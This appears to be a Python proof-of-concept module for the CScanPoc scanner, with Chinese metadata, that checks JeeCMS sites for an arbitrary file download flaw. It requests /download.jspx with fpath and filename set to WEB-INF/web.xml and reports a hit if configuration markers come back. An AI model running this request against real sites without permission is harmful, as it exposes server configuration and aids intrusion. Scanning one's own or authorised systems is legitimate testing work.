# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'JeeCMS_0011'  # 平台漏洞编号，留空
    name = 'JeeCMS任意文件下载导致敏感信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2014-12-26'  # 漏洞公布时间
    desc = '''
        JeeCMSS中 /download.jspx 文件用于文件下载,fpath及filename参数未做正确过滤限制,导致可下载任意文件
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=77960'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'JeeCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'afe0c57b-b179-42ee-9bc6-0d50bc20ecde'
    author = '国光'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = '{target}'.format(
                target=self.target)+"/download.jspx?fpath=WEB-INF/web.xml&filename=WEB-INF/web.xml"
            request = urllib.request.Request(verify_url)
            response = urllib.request.urlopen(request)
            content = str(response.read())
            if 'WEB-INF/config/' in content and 'contextConfigLocation' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
